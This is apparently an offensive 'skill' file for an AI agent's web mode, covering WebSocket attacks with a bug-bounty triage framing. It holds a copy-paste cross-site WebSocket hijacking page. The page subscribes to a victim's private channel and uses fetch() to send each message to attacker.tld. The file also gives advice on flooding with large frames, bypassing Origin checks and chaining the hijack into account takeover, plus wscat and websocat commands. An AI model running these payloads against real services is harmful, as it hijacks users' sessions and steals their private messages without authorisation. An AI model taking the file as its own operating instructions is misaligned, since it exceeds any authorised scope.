# SKILL: WebSocket Attacks (CSWSH / Auth bypass / Injection / DoS)

## Version: 1.0 | Domain: web | Trigger: `WEB MODE` + (websocket attacks (cswsh / auth bypass / injection / dos)) or pasted request matching this class

---

## IDENTITY IN THIS SKILL
WebSockets bypass CORS by default. CSWSH = Cross-Site WebSocket Hijacking — same as CSRF but for WS.

---

## DETECTION
Find ws/wss endpoints. Check Origin validation, Sec-WebSocket-Key, auth model (cookie? token in URL?).

## EXPLOITATION
### CSWSH (no Origin check)
Attacker page:
```html
<script>
const ws = new WebSocket('wss://target.com/ws');
ws.onmessage = e => fetch('https://attacker.tld/?d='+btoa(e.data));
ws.onopen = () => ws.send('{"action":"subscribe","channel":"private:'+victim+'"}');
</script>
```

### Token in URL leak
`wss://target/ws?token=eyJ...` → tokens land in browser history, server logs, referer headers.

### Message-level injection
WS app passes raw payload to backend RPC; SQLi/XSS/SSRF still possible.

### DoS — large frame / flood
Send 10MB frame; many WS impls don't limit.

### Authentication bypass via subscribe
Subscribe to channels named after other users without auth check.

## PAYLOADS (real, copy-paste, grouped)
(see above)

## BYPASS TECHNIQUES
Origin enforcement — most fail by accepting `null` (sandboxed iframe) or partial-match.

## CHAIN POTENTIAL
CSWSH + private channel subscribe = victim message exfil + ATO via support chat.

## TOOLS
wscat, websocat, Burp WebSocket tab

## COMMANDS
```bash
wscat -c "wss://target/ws" -H "Authorization: Bearer $T"
websocat "wss://target/ws?token=$T"
```

## EDGE CASES / NOT-A-BUG TRAPS
STOMP/SockJS often layer on WS — auth model differs.

## TRIAGE ANGLE (per platform)
Show victim's private message intercepted by attacker page.

## SEVERITY & CVSS
7.5–9.0.

## REFERENCES
PortSwigger WebSockets
